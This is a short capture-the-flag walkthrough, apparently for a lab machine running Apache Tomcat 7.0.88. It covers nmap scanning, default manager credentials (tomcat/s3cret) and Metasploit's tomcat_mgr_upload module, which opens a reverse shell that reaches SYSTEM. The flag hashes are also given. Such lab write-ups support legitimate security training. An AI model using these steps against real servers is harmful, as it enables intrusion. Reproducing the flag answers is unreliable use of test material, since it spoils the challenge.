nmap -> apache tomcat 7.0.88 listening on port 8080
http://[machine IP]:8080/ -> Manager App with random credentials
Read the access denied page -> find usr:tomcat pwd:s3cret -> working admin credentials
sudo msfconsole -> search tomcat manager -> use multi/http/tomcat_mgr_upload
set HttpPassword HttpUsername RHOSTS LHOST RPORT
--> in meterpreter
shell
--> in shell
whoami
--> nt authority\system (== root)
cd C:\Users\Administrator\Desktop\flags
type "2 for the price of 1.txt"
|
v
user.txt
7004dbcef0f854e0fb401875f26ebd00
root.txt
04a8b36e1545a455393d067e772fe90e
